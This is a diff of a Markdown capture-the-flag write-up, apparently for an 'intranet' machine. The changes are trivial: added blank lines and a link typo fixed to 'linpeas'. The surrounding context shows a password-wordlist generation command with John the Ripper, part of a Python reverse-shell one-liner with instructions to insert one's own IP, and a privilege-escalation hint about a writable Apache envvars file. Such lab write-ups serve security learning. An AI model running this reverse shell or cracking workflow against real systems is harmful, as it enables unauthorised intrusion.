@@ -54,6 +54,7 @@ john --wordlist=password.txt --rules=jumbo --stdout > passwords.txt
 ```
 
 > the password.txt file contains the word **securesolacoders**, don't forget to remove the special chars from passwords.txt
+
 * You can remove special characters from passwords.txt using this command:
 
 ```console
@@ -172,6 +173,7 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 > Don't forget to add your ip address and url-encode the payload before you send the request.
 
 ![intranet18](/images/intranet18.png)
+
 ![intranet19](/images/intranet19.png)
 
 
@@ -210,7 +212,7 @@ ps auxw
 
 * Running **linpeas** will reveal that the envvars file in /etc/apache2 is writable by anders.
 
-> [linpes](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+> [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
 
 ![intranet26](/images/intranet26.png)
 
